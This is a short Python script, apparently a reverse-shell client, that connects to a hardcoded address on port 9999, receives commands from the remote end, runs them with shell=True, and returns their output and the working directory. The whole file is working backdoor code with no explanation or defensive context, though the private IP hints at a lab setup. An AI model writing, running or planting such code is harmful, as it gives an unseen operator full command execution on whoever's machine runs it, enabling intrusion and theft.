import os
import socket
import subprocess


s = socket.socket()
host = '10.100.102.10'
port = 9999
s.connect((host, port))

while True:
    data = s.recv(1024)
    if data.decode("utf-8").startswith("cd "):
        os.chdir(data[3:].decode("utf-8"))
        s.send(str.encode(str(os.getcwd() + '$ ')))  # Send the updated directory as a response
        continue
    if len(data) > 0:
        cmd = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = output_bytes.decode("utf-8", errors='ignore')
        s.send(str.encode(output_str + str(os.getcwd() + '$ ')))
        print(output_str, end='')
        
# Close connection
s.close()
